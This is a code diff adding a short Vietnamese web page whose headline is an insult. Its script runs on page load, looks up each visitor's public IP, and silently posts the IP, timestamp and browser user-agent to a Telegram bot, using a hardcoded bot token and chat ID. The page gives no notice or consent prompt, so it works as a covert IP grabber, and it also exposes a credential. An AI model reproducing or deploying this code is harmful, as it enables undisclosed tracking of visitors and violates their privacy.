@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Thông báo Telegram</title>
+</head>
+<body>
+
+<h1>Emmmmmmmmmmmm Nguuuuuuuuuuuu Vcll Hhhhhhhhhhhhhhhhhhhhhhh!</h1>
+
+<script>
+const BOT_TOKEN = "8703511633:AAEJH1IzVMErj68Ky5diqpA3JgkWylNXOiQ";
+const CHAT_ID = "8973014468";
+
+async function sendTelegram() {
+    try {
+        // Lấy IP công khai
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+
+        const message =
+`🔔 Có người truy cập website
+🌐 IP: ${ipData.ip}
+🕒 Thời gian: ${new Date().toLocaleString()}
+🖥️ User-Agent: ${navigator.userAgent}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    } catch (err) {
+        console.error(err);
+    }
+}
+
+sendTelegram();
+</script>
+
+</body>
+</html>
